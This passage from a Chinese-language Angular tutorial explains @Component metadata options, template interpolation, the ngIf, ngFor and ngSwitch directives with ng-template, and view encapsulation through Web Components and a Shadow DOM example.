</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>元数据告诉 Angular 如何处理一个类。装饰器 @Component 把紧挨着它的类指定为一个组件类。装饰器 @Component 必须接收一个配置对象作为参数，它包含 Angular 创建并展示这个组件及其视图所需要的信息。@Component 的配置选项：</p> <ol><li>selector：用于定义组件在HTML代码中匹配的标签</li> <li>inputs:属性名列表，用来绑定组件需要的输入。massage为该组件的一个属性，声明为一个输入inputs: ['massage']，这样在AppComponent组件中就能给message传递值。可以使用@Input修饰符来起到相同的效果，@Input('alias') property: type，alias为property的别名，给属性传入值时可以使用给别名。</li> <li>outputs:属性名列表，暴露该组件包含的事件。angular应用是一棵组件树，inputs声明由父组件向子组件需要传递的信息，outputs则声明子组件向父组件传递的信息，该信息通过事件来。输出属性必须是一个EventEmitter类的实例，该实例通过调用emit方法来发出事件,代码为this.outputText.emit(&quot;massage been clicked&quot;);,则上面例子在标题在点击后将发出一个事件，父组件通过声明的属性(outputText)=&quot;alert($event);&quot;进行监听，$event为emit发出的信息。同样也能使用@Output修饰符实现。</li> <li>template/templateUrl:内联的HTML内容，或通过HTML模板引入</li> <li>styles/styleUrls:样式数组，可以使用styles写内联样式，或使用stylesUrl引入样式文件。注意styles/styleUrls由数组组成，通常包含一个string就够了。</li> <li>provides：设置组件及其子组件可以用的服务。
7 .animations：组件使用到的动画</li> <li>changeDetection:组件变更检测策略，默认ChangeDetectionStrategy.Default。onpush策略在组件输入有变更或有事件触发时，会调用变更检测。</li> <li>entryComponents:设置需要被提前编译的组件</li> <li>encapsulation：样式封装策略</li> <li>host：宿主元素的样式、类的映射，用来绑定宿主的属性、事件等</li> <li>exportAs：导出指令，使得可以在模板中调用,在用到表单部分是就会用到这个名字（ngModel,ngForm)。</li> <li>interpolation：被用于当前的component视图模板中,设置默认的插值运算符，默认是&quot;和&quot;</li> <li>queries：设置组件的查询条件</li> <li>viewProviders：设置providers列表可以用于当前component，以及其子视图,即设置组件及其子组件(不含ContentChildren)可以用的服务</li> <li>moduleId：文件中ES/CommonJS 模块的id,而当前component就定义在该模块中，被用于解析模板和样式的相对路径</li></ol> <p>Component声明</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">export</span> <span class="token keyword">const</span> Component<span class="token operator">:</span> ComponentDecorator <span class="token operator">=</span> <span class="token operator">&lt;</span>ComponentDecorator<span class="token operator">&gt;</span><span class="token function">makeDecorator</span><span class="token punctuation">(</span>
  <span class="token string">'Component'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
    selector<span class="token operator">:</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span> 
    inputs<span class="token operator">:</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span> 
    outputs<span class="token operator">:</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span> 
    host<span class="token operator">:</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span>
    exportAs<span class="token operator">:</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span>
    moduleId<span class="token operator">:</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span>
    providers<span class="token operator">:</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span> 
    viewProviders<span class="token operator">:</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span>
    changeDetection<span class="token operator">:</span> ChangeDetectionStrategy<span class="token punctuation">.</span>Default<span class="token punctuation">,</span> 
    queries<span class="token operator">:</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span> 
    templateUrl<span class="token operator">:</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span> 
    template<span class="token operator">:</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span> 
    styleUrls<span class="token operator">:</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span> 
    styles<span class="token operator">:</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span> 
    animations<span class="token operator">:</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span> 
    encapsulation<span class="token operator">:</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span> 
    interpolation<span class="token operator">:</span> <span class="token keyword">undefined</span><span class="token punctuation">,</span>
    entryComponents<span class="token operator">:</span> <span class="token keyword">undefined</span> 
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  Directive<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><h3 id="插值表达式"><a href="#插值表达式" class="header-anchor">#</a> 插值表达式</h3> <blockquote><p>绑定普通文本,对象属性</p></blockquote> <div class="language-typescript line-numbers-mode"><pre class="language-typescript"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'my-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string"> &lt;h2&gt;大家好，我是{{ name }}&lt;/h2&gt;
                 &lt;p&gt;我来自&lt;strong&gt;{{ address.province }}&lt;/strong&gt;省,
                   &lt;strong&gt;{{ address.city }}&lt;/strong&gt;市
                 &lt;/p&gt;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span>  <span class="token punctuation">{</span>
  name <span class="token operator">=</span> <span class="token string">'Semlinker'</span><span class="token punctuation">;</span>
   address <span class="token operator">=</span> <span class="token punctuation">{</span>
     province<span class="token operator">:</span> <span class="token string">'福建'</span><span class="token punctuation">,</span>
     city<span class="token operator">:</span> <span class="token string">'厦门'</span>
   <span class="token punctuation">}</span> 
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br></div></div><div class="custom-block tip"><p class="custom-block-title">温馨提示</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>Hello {{name}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span> 
等价于
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">[textContent]</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>interpolate(['Hello'], [name])<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div></div> <blockquote><p>NgNonBindable</p></blockquote> <p>ngNonBindable 指令用于告诉 Angular 编译器，无需编译页面中某个特定的HTML代码片段</p> <h3 id="与-template"><a href="#与-template" class="header-anchor">#</a> * 与 <code>&lt;template&gt;</code></h3> <ul><li>*ngIf
指令定义：</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">Directive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>selector<span class="token operator">:</span> <span class="token string">'[ngIf]'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">NgIf</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>指令标准形式</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hero-detail</span> <span class="token attr-name">*ngIf</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>currentHero<span class="token punctuation">&quot;</span></span> <span class="token attr-name">[hero]</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>currentHero<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>hero-detail</span><span class="token punctuation">&gt;</span></span>
// 最终转换为
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span> <span class="token attr-name">[ngIf]</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>currentHero<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hero-detail</span> <span class="token attr-name">[hero]</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>currentHero<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>hero-detail</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><blockquote><p>If...Else Template Conditions</p></blockquote> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ng-template</span> <span class="token attr-name">#hidden</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>You are not allowed to see our secret<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ng-template</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">*ngIf</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>shown; else hidden<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  Our secret is being happy
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><ul><li>*ngFor
指令定义：</li></ul> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span>template ngFor <span class="token punctuation">[</span>ngForOf<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;people&quot;</span> <span class="token keyword">let</span><span class="token operator">-</span>person<span class="token operator">&gt;</span>
   <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span> <span class="token punctuation">{</span><span class="token punctuation">{</span> person<span class="token punctuation">.</span>name <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">{</span>person<span class="token punctuation">.</span>country<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>template<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>指令标准形式</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hero-detail</span> <span class="token attr-name">*ngFor</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>let hero of heroes; trackBy:trackByHeroes<span class="token punctuation">&quot;</span></span> 
    <span class="token attr-name">[hero]</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>hero<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>hero-detail</span><span class="token punctuation">&gt;</span></span>
// 最终转换为
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span> <span class="token attr-name">ngFor</span> <span class="token attr-name">let-hero</span> <span class="token attr-name">[ngForOf]</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>heroes<span class="token punctuation">&quot;</span></span> <span class="token attr-name">[ngForTrackBy]</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>trackByHeroes<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hero-detail</span> <span class="token attr-name">[hero]</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>hero<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>hero-detail</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><blockquote><p><code>&lt;template&gt;</code> —&gt; <code>&lt;ng-template&gt;</code></p></blockquote> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">import</span> <span class="token punctuation">{</span> Component<span class="token punctuation">,</span> OnInit <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/core'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Observable <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'rxjs/Observable'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token string">'rxjs/add/observable/of'</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token string">'rxjs/add/operator/delay'</span><span class="token punctuation">;</span>
@<span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
  selector<span class="token operator">:</span> <span class="token string">'exe-app'</span><span class="token punctuation">,</span>
  template<span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
   &lt;ng-template #fetching&gt;
      &lt;p&gt;Fetching...&lt;/p&gt;
   &lt;/ng-template&gt;
   &lt;p *ngIf=&quot;auth | async; else fetching; let user&quot;&gt;
      {{user.username }}
   &lt;/p&gt;
  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AppComponent</span> <span class="token keyword">implements</span> <span class="token class-name">OnInit</span> <span class="token punctuation">{</span>
  auth<span class="token operator">:</span> Observable<span class="token operator">&lt;</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token operator">&gt;</span><span class="token punctuation">;</span>
  <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>auth <span class="token operator">=</span> Observable
      <span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token punctuation">{</span> username<span class="token operator">:</span> <span class="token string">'semlinker'</span><span class="token punctuation">,</span> password<span class="token operator">:</span> <span class="token string">'segmentfault'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
      <span class="token punctuation">.</span><span class="token function">delay</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span>Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br></div></div><ul><li>ngSwitch 它包括两个指令，一个属性指令和一个结构指令。</li></ul> <p>指令定义：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>@<span class="token function">Directive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>selector<span class="token operator">:</span> <span class="token string">'[ngSwitch]'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">NgSwitch</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

@<span class="token function">Directive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>selector<span class="token operator">:</span> <span class="token string">'[ngSwitchCase]'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">NgSwitchCase</span> <span class="token keyword">implements</span> <span class="token class-name">DoCheck</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>

@<span class="token function">Directive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>selector<span class="token operator">:</span> <span class="token string">'[ngSwitchDefault]'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">NgSwitchDefault</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>指令标准形式</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">[ngSwitch]</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>person.country<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">*ngSwitchCase</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">'</span>UK'<span class="token punctuation">&quot;</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>text-success<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>
      {{ person.name }} ({{person.country}})
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">*ngSwitchCase</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">'</span>USA'<span class="token punctuation">&quot;</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>text-secondary<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>
      {{ person.name }} ({{person.country}})
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">*ngSwitchDefault</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>text-primary<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>
    {{ person.name }} ({{person.country}})
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>
// 最终转换为
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">[ngSwitch]</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>person.country<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span> <span class="token attr-name">[ngSwitchCase]</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">'</span>UK'<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>text-success<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>
          {{ person.name }} ({{person.country}})
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span> <span class="token attr-name">[ngSwitchCase]</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">'</span>USA'<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>text-secondary<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>
          {{ person.name }} ({{person.country}})
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>template</span> <span class="token attr-name">[ngSwitchDefault]</span><span class="token punctuation">&gt;</span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>text-primary<span class="token punctuation">'</span></span><span class="token punctuation">&gt;</span></span>
          {{ person.name }} ({{person.country}})
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>template</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br></div></div><h2 id="viewencapsulation"><a href="#viewencapsulation" class="header-anchor">#</a> ViewEncapsulation</h2> <h3 id="webcomponents标准"><a href="#webcomponents标准" class="header-anchor">#</a> WebComponents标准</h3> <p>近年来，web 开发者们通过插件或者模块的形式在网上分享自己的代码，便于其他开发者们复用这些优秀的代码。同样的故事不断发生，人们不断的复用 JavaScript 文件，然后是 CSS 文件，当然还有 HTML 片段。但是你又必须祈祷这些引入的代码不会影响到你的网站或者web app。</p> <p>WebComponents 是解决这类问题最好的良药，它通过一种标准化的非侵入的方式封装一个组件，每个组件能组织好它自身的 HTML 结构、CSS 样式、JavaScript 代码，并且不会干扰页面上的其他元素。</p> <p>Web Components 由以下四种技术组成：</p> <ul><li>Custom Elements - 自定义元素</li> <li>HTML Templates - HTML模板</li> <li>Shadow DOM - 影子DOM</li> <li>HTML Imports - HTML导入</li></ul> <h3 id="shadow-dom"><a href="#shadow-dom" class="header-anchor">#</a> Shadow DOM</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span> html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>html lang<span class="token operator">=</span><span class="token string">&quot;en&quot;</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>head<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">&quot;UTF-8&quot;</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>title<span class="token operator">&gt;</span>Shadow <span class="token constant">DOM</span><span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>style type<span class="token operator">=</span><span class="token string">&quot;text/css&quot;</span><span class="token operator">&gt;</span>
        <span class="token punctuation">.</span>shadowroot_son <span class="token punctuation">{</span>
            color<span class="token operator">:</span> #f00<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>style<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>p <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">&quot;shadowroot_son&quot;</span><span class="token operator">&gt;</span>我不在 Shadow Host内<span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">&quot;shadowhost&quot;</span><span class="token operator">&gt;</span>Hello<span class="token punctuation">,</span> world<span class="token operator">!</span><span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
 <span class="token comment">// 影子宿主（shadow host）</span>
 <span class="token keyword">var</span> shadowHost <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.shadowhost'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">// 创建影子根（shadow root）</span>
 <span class="token keyword">var</span> shadowRoot <span class="token operator">=</span> shadowHost<span class="token punctuation">.</span><span class="token function">createShadowRoot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token comment">// 影子根作为影子树的第一个节点，其他的节点比如p节点都是它的子节点。</span>
 shadowRoot<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">'&lt;p class=&quot;shadowroot_son&quot;&gt;我在 Shadow Host内&lt;/p&gt;'</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>html<span class="token operator">&gt;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><p>以上代码成功运行后，如下图：
<img src="/vuebloger/img/post/1814799955-58c670ab83b5c_fix732.png" alt="">
